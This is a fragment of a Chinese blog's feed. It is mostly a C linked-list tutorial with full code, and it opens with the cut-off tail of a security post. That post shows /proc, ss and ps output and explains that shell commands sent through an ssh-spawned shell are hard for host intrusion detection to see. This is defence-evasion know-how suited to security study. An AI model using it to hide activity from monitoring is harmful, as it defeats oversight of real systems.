class="built_in">ls</span> -al /proc/13449/fd</span></span><br><span class="line">total 0</span><br><span class="line">dr-x------ 2 USERNAME USERNAME  0 Jun 18 17:12 .</span><br><span class="line">dr-xr-xr-x 9 USERNAME USERNAME  0 Jun 18 17:12 ..</span><br><span class="line">lrwx------ 1 USERNAME USERNAME 64 Jun 18 17:12 0 -&gt; /dev/pts/2</span><br><span class="line">lrwx------ 1 USERNAME USERNAME 64 Jun 18 17:12 1 -&gt; /dev/pts/2</span><br><span class="line">lrwx------ 1 USERNAME USERNAME 64 Jun 18 17:12 2 -&gt; /dev/pts/2</span><br><span class="line">lrwx------ 1 USERNAME USERNAME 64 Jun 18 17:12 3 -&gt; socket:[169479331]</span><br></pre></td></tr></table></figure><br>可以发现在服务器端的59070连接了2222端口，进程是13449．由于从客户端接受过来的数据都是经过ssh解密的，所以对于HIDS来说是很难发现异常的．<br>此时客户端的网络连接状态是：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ss -anptw | grep 22</span>  </span><br><span class="line">tcp   LISTEN    0       128             0.0.0.0:22               0.0.0.0:*                                                                                     </span><br><span class="line">tcp   ESTAB     0       0            172.16.1.2:41424      40.77.226.250:443     users:((&quot;code&quot;,pid=5822,fd=49))                                               </span><br><span class="line">tcp   ESTAB     0       0            172.16.1.2:37930      40.77.226.250:443     users:((&quot;code&quot;,pid=5822,fd=41))                                               </span><br><span class="line">tcp   ESTAB     0       0            172.16.1.2:33198     IP.OF.REMOTE.MACHINE:22      users:((&quot;main&quot;,pid=32069,fd=5))                                               </span><br><span class="line">tcp   ESTAB     0       0            172.16.1.2:57664      40.77.226.250:443     users:((&quot;code&quot;,pid=5822,fd=40))                                               </span><br><span class="line">tcp   LISTEN    0       128                [::]:22                  [::]:*</span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ps -ef | grep 32393</span></span><br><span class="line">spoock  32393 32069  0 17:12 pts/4    00:00:00 /bin/sh</span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span> -al /proc/32393/fd</span></span><br><span class="line">dr-x------ 2 spoock spoock  0 Jun 18 17:15 .</span><br><span class="line">dr-xr-xr-x 9 spoock spoock  0 Jun 18 17:15 ..</span><br><span class="line">lrwx------ 1 spoock spoock 64 Jun 18 17:15 0 -&gt; /dev/pts/4</span><br><span class="line">lrwx------ 1 spoock spoock 64 Jun 18 17:15 1 -&gt; /dev/pts/4</span><br><span class="line">lrwx------ 1 spoock spoock 64 Jun 18 17:15 10 -&gt; /dev/tty</span><br><span class="line">lrwx------ 1 spoock spoock 64 Jun 18 17:15 2 -&gt; /dev/pts/4</span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span> -al /proc/32069/fd</span></span><br><span class="line">dr-x------ 2 spoock spoock  0 Jun 18 17:01 .</span><br><span class="line">dr-xr-xr-x 9 spoock spoock  0 Jun 18 17:01 ..</span><br><span class="line">lrwx------ 1 spoock spoock 64 Jun 18 17:01 0 -&gt; /dev/pts/2</span><br><span class="line">lrwx------ 1 spoock spoock 64 Jun 18 17:01 1 -&gt; /dev/pts/2</span><br><span class="line">lrwx------ 1 spoock spoock 64 Jun 18 17:01 2 -&gt; /dev/pts/2</span><br><span class="line">lrwx------ 1 spoock spoock 64 Jun 18 17:01 3 -&gt; &#x27;socket:[559692]&#x27;</span><br><span class="line">lrwx------ 1 spoock spoock 64 Jun 18 17:01 4 -&gt; &#x27;anon_inode:[eventpoll]&#x27;</span><br><span class="line">lrwx------ 1 spoock spoock 64 Jun 18 17:01 5 -&gt; &#x27;socket:[559693]&#x27;</span><br><span class="line">lrwx------ 1 spoock spoock 64 Jun 18 17:15 6 -&gt; /dev/ptmx</span><br><span class="line">lrwx------ 1 spoock spoock 64 Jun 18 17:15 7 -&gt; /dev/pts/4</span><br></pre></td></tr></table></figure><p>客户端的含义就是：在ssh连接进程中派生出了sh进程，在sh进程中执行命令，但是由于执行的命令全部都是通过ssh加密发送的，在流量上是无法看到．</p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
            <tag> 漏洞 </tag>
            
            <tag> golang </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linked list foundation - C language description</title>
      <link href="/2022/07/22/Linked-list-foundation-C-language-description/"/>
      <url>/2022/07/22/Linked-list-foundation-C-language-description/</url>
      
        <content type="html"><![CDATA[<h1 id="链表-Linked-list"><a href="#链表-Linked-list" class="headerlink" title="链表(Linked list)"></a>链表(Linked list)</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>链表（Linked list）是一种常见的基础数据结构，是一种线性表，但是并不会按线性的顺序存储数据，而是在每一个节点里存到下一个节点的指针(Pointer)。</p><p>链表结构可以充分利用计算机内存空间，实现灵活的内存动态管理。但是链表失去了数组随机读取的优点，同时链表由于增加了结点的指针域，空间开销比较大。</p><h1 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h1><blockquote><p>本文假定访问者对计算机程序设计语言有一定基础了解</p><p>以下对链表的操作实现均建立在已创建好链表的基础上，创建链表的代码如下所示：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//声明节点结构</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Link</span> &#123;</span></span><br><span class="line">    <span class="type">int</span>  elem;<span class="comment">//存储整形元素</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Link</span> *<span class="title">next</span>;</span><span class="comment">//指向直接后继元素的指针</span></span><br><span class="line">&#125;link;</span><br><span class="line"><span class="comment">//创建链表的函数</span></span><br><span class="line">link * <span class="title function_">initLink</span><span class="params">()</span> &#123;</span><br><span class="line">    link * p = (link*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(link));<span class="comment">//创建一个头结点</span></span><br><span class="line">    link * temp = p;<span class="comment">//声明一个指针指向头结点，用于遍历链表</span></span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//生成链表</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">        <span class="comment">//创建节点并初始化</span></span><br><span class="line">        link *a = (link*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(link));</span><br><span class="line">        a-&gt;elem = i;</span><br><span class="line">        a-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="comment">//建立新节点与直接前驱节点的逻辑关系</span></span><br><span class="line">        temp-&gt;next = a;</span><br><span class="line">        temp = temp-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>该链表是一个具有头节点的链表。由于头节点本身不用于存储数据，因此在实现对链表中数据的”增删查改”时要注意。</p></blockquote><h1 id="链表插入元素-insert"><a href="#链表插入元素-insert" class="headerlink" title="链表插入元素 insert"></a>链表插入元素 insert</h1><p>同顺序表一样，向链表中增添元素，根据添加位置不同，可分为以下 3 种情况：<br>· 插入到链表的头部（头节点之后），作为首元节点；<br>· 插入到链表中间的某个位置；<br>· 插入到链表的最末端，作为链表中最后一个数据元素；</p><p>虽然新元素的插入位置不固定，但是链表插入元素的思想是固定的，只需做以下两步操作，即可将新元素插入到指定的位置：</p><ol><li>将新结点的 next 指针指向插入位置后的结点；</li><li>将插入位置前结点的 next 指针指向插入结点；</li></ol><p>例如，我们在链表 {1,2,3,4} 的基础上分别实现在头部、中间部位、尾部插入新元素 5，其实现过程如图所示：<br><img src="https://s2.loli.net/2022/07/22/84u69YiOE7fRJGq.png" alt="insert"></p><p>可以看出，虽然新元素的插入位置不同，但实现插入操作的方法是一致的，都是先执行步骤 1 ，再执行步骤 2。</p><blockquote><p>注意：链表插入元素的操作必须是先步骤 1，再步骤 2；反之，若先执行步骤 2，会导致插入位置后续的部分链表丢失，无法再实现步骤 1。</p></blockquote><h3 id="insert实现方法："><a href="#insert实现方法：" class="headerlink" title="insert实现方法："></a>insert实现方法：</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//p为原链表，elem表示新数据元素，add表示新元素要插入的位置</span></span><br><span class="line">link * <span class="title function_">insertElem</span><span class="params">(link * p, <span class="type">int</span> elem, <span class="type">int</span> add)</span> &#123;</span><br><span class="line">    link * temp = p;<span class="comment">//创建临时结点temp</span></span><br><span class="line">    link * c = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//首先找到要插入位置的上一个结点</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; add; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (temp == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;插入位置无效\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">        temp = temp-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//创建插入结点c</span></span><br><span class="line">    c = (link*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(link));</span><br><span class="line">    c-&gt;elem = elem;</span><br><span class="line">    <span class="comment">//向链表中插入结点</span></span><br><span class="line">    c-&gt;next = temp-&gt;next;</span><br><span class="line">    temp-&gt;next = c;</span><br><span class="line">    <span class="keyword">return</span>  p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>insertElem 函数中加入一个 if 语句，用于判断用户输入的插入位置是否有效。例如，在已存储 {1,2,3} 的链表中，用户要求在链表中第 100 个数据元素所在的位置插入新元素，显然用户操作无效，此时就会触发 if 语句。</p></blockquote><h1 id="链表删除元素-delete"><a href="#链表删除元素-delete" class="headerlink" title="链表删除元素 delete"></a>链表删除元素 delete</h1><p>从链表中删除指定数据元素时，实则就是将存有该数据元素的节点从链表中摘除，但作为一名合格的程序员，要对存储空间负责，对不再利用的存储空间要及时释放。因此，从链表中删除数据元素需要进行以下 2 步操作：</p><ol><li>将结点从链表中摘下来;</li><li>手动释放掉结点，回收被结点占用的存储空间;</li></ol><p>其中，从链表上删除某节点的实现非常简单，只需找到该节点的直接前驱节点 temp，执行一行程序：</p><blockquote><p>temp-&gt;next=temp-&gt;next-&gt;next;</p></blockquote><p>例如，从存有 {1,2,3,4} 的链表中删除元素 3，则此代码的执行效果如图 2 所示：<br><img src="https://s2.loli.net/2022/07/22/432JPU7BYbZCOja.png" alt="Delete"></p><h3 id="delete实现方法："><a href="#delete实现方法：" class="headerlink" title="delete实现方法："></a>delete实现方法：</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//p为原链表，add为要删除元素的值</span></span><br><span class="line">link * <span class="title function_">delElem</span><span class="params">(link * p, <span class="type">int</span> add)</span> &#123;</span><br><span class="line">    link * temp = p;</span><br><span class="line">    link * del = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//temp指向被删除结点的上一个结点</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; add; i++) &#123;</span><br><span class="line">        temp = temp-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    del = temp-&gt;next;<span class="comment">//单独设置一个指针指向被删除结点，以防丢失</span></span><br><span class="line">    temp-&gt;next = temp-&gt;next-&gt;next;<span class="comment">//删除某个结点的方法就是更改前一个结点的指针域</span></span><br><span class="line">    <span class="built_in">free</span>(del);<span class="comment">//手动释放该结点，防止内存泄漏</span></span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>可以看到，从链表上摘下的节点 del 最终通过 free 函数进行了手动释放。</p></blockquote><h1 id="链表查找元素-Find"><a href="#链表查找元素-Find" class="headerlink" title="链表查找元素 Find"></a>链表查找元素 Find</h1><p>在链表中查找指定数据元素，最常用的方法是：从表头依次遍历表中节点，用被查找元素与各节点数据域中存储的数据元素进行比对，直至比对成功或遍历至链表最末端的 NULL（比对失败的标志）。</p><h1 id="Find实现方法"><a href="#Find实现方法" class="headerlink" title="Find实现方法"></a>Find实现方法</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//p为原链表，elem表示被查找元素、</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">selectElem</span><span class="params">(link * p, <span class="type">int</span> elem)</span> &#123;</span><br><span class="line">    <span class="comment">//新建一个指针t，初始化为头指针 p</span></span><br><span class="line">    link * t = p;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">//由于头节点的存在，因此while中的判断为t-&gt;next</span></span><br><span class="line">    <span class="keyword">while</span> (t-&gt;next) &#123;</span><br><span class="line">        t = t-&gt;next;</span><br><span class="line">        <span class="keyword">if</span> (t-&gt;elem == elem) &#123;</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//程序执行至此处，表示查找失败</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>注意，遍历有头节点的链表时，需避免头节点对测试数据的影响，因此在遍历链表时，建立使用上面代码中的遍历方法，直接越过头节点对链表进行有效遍历。</p></blockquote><h1 id="链表更新元素-Update"><a href="#链表更新元素-Update" class="headerlink" title="链表更新元素 Update"></a>链表更新元素 Update</h1><p>更新链表中的元素，只需通过遍历找到存储此元素的节点，对节点中的数据域做更改操作即可。</p><h1 id="Update实现方法"><a href="#Update实现方法" class="headerlink" title="Update实现方法"></a>Update实现方法</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//更新函数，其中，add 表示更改结点在链表中的位置，newElem 为新的数据域的值</span></span><br><span class="line">link *<span class="title function_">amendElem</span><span class="params">(link * p, <span class="type">int</span> add, <span class="type">int</span> newElem)</span> &#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    link * temp = p;</span><br><span class="line">    temp = temp-&gt;next;<span class="comment">//在遍历之前，temp指向首元结点</span></span><br><span class="line">    <span class="comment">//遍历到被删除结点</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; add; i++) &#123;</span><br><span class="line">        temp = temp-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    temp-&gt;elem = newElem;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="完整代码-Main"><a href="#完整代码-Main" class="headerlink" title="完整代码 Main()"></a>完整代码 Main()</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Link</span> &#123;</span></span><br><span class="line">    <span class="type">int</span>  elem;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Link</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;link;</span><br><span class="line">link * <span class="title function_">initLink</span><span class="params">()</span>;</span><br><span class="line"><span class="comment">//链表插入的函数，p是链表，elem是插入的结点的数据域，add是插入的位置</span></span><br><span class="line">link * <span class="title function_">insertElem</span><span class="params">(link * p, <span class="type">int</span> elem, <span class="type">int</span> add)</span>;</span><br><span class="line"><span class="comment">//删除结点的函数，p代表操作链表，add代表删除节点的位置</span></span><br><span class="line">link * <span class="title function_">delElem</span><span class="params">(link * p, <span class="type">int</span> add)</span>;</span><br><span class="line"><span class="comment">//查找结点的函数，elem为目标结点的数据域的值</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">selectElem</span><span class="params">(link * p, <span class="type">int</span> elem)</span>;</span><br><span class="line"><span class="comment">//更新结点的函数，newElem为新的数据域的值</span></span><br><span class="line">link *<span class="title function_">amendElem</span><span class="params">(link * p, <span class="type">int</span> add, <span class="type">int</span> newElem)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">display</span><span class="params">(link *p)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    link *p = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> address;</span><br><span class="line">    <span class="comment">//初始化链表（1，2，3，4）</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;初始化链表为：\n&quot;</span>);</span><br><span class="line">    p = initLink();</span><br><span class="line">    display(p);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;在第4的位置插入元素5：\n&quot;</span>);</span><br><span class="line">    p = insertElem(p, <span class="number">5</span>, <span class="number">4</span>);</span><br><span class="line">    display(p);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;删除元素3:\n&quot;</span>);</span><br><span class="line">    p = delElem(p, <span class="number">3</span>);</span><br><span class="line">    display(p);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;查找元素2的位置为：\n&quot;</span>);</span><br><span class="line">    address = selectElem(p, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span> (address == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;没有该元素&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;元素2的位置为：%d\n&quot;</span>, address);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;更改第3的位置上的数据为7:\n&quot;</span>);</span><br><span class="line">    p = amendElem(p, <span class="number">3</span>, <span class="number">7</span>);</span><br><span class="line">    display(p);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">link * <span class="title function_">initLink</span><span class="params">()</span> &#123;</span><br><span class="line">    link * p = (link*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(link));<span class="comment">//创建一个头结点</span></span><br><span class="line">    link * temp = p;<span class="comment">//声明一个指针指向头结点，用于遍历链表</span></span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//生成链表</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">        link *a = (link*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(link));</span><br><span class="line">        a-&gt;elem = i;</span><br><span class="line">        a-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">        temp-&gt;next = a;</span><br><span class="line">        temp = temp-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line">link * <span class="title function_">insertElem</span><span class="params">(link * p, <span class="type">int</span> elem, <span class="type">int</span> add)</span> &#123;</span><br><span class="line">    link * temp = p;<span class="comment">//创建临时结点temp</span></span><br><span class="line">    link * c = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//首先找到要插入位置的上一个结点</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; add; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (temp == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;插入位置无效\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">        temp = temp-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//创建插入结点c</span></span><br><span class="line">    c = (link*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(link));</span><br><span class="line">    c-&gt;elem = elem;</span><br><span class="line">    <span class="comment">//向链表中插入结点</span></span><br><span class="line">    c-&gt;next = temp-&gt;next;</span><br><span class="line">    temp-&gt;next = c;</span><br><span class="line">    <span class="keyword">return</span>  p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">link * <span class="title function_">delElem</span><span class="params">(link * p, <span class="type">int</span> add)</span> &#123;</span><br><span class="line">    link * temp = p;</span><br><span class="line">    link * del = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//遍历到被删除结点的上一个结点</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; add; i++) &#123;</span><br><span class="line">        temp = temp-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    del = temp-&gt;next;<span class="comment">//单独设置一个指针指向被删除结点，以防丢失</span></span><br><span class="line">    temp-&gt;next = temp-&gt;next-&gt;next;<span class="comment">//删除某个结点的方法就是更改前一个结点的指针域</span></span><br><span class="line">    <span class="built_in">free</span>(del);<span class="comment">//手动释放该结点，防止内存泄漏</span></span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">selectElem</span><span class="params">(link * p, <span class="type">int</span> elem)</span> &#123;</span><br><span class="line">    link * t = p;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (t-&gt;next) &#123;</span><br><span class="line">        t = t-&gt;next;</span><br><span class="line">        <span class="keyword">if</span> (t-&gt;elem == elem) &#123;</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">link *<span class="title function_">amendElem</span><span class="params">(link * p, <span class="type">int</span> add, <span class="type">int</span> newElem)</span> &#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    link * temp = p;</span><br><span class="line">    temp = temp-&gt;next;<span class="comment">//tamp指向首元结点</span></span><br><span class="line">    <span class="comment">//temp指向被删除结点</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; add; i++) &#123;</span><br><span class="line">        temp = temp-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    temp-&gt;elem = newElem;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">display</span><span class="params">(link *p)</span> &#123;</span><br><span class="line">    link* temp = p;<span class="comment">//将temp指针重新指向头结点</span></span><br><span class="line">    <span class="comment">//只要temp指针指向的结点的next不是Null，就执行输出语句。</span></span><br><span class="line">    <span class="keyword">while</span> (temp-&gt;next) &#123;</span><br><span class="line">        temp = temp-&gt;next;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, temp-&gt;elem);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="运行结果示例-Result"><a href="#运行结果示例-Result" class="headerlink" title="运行结果示例 Result"></a>运行结果示例 Result</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 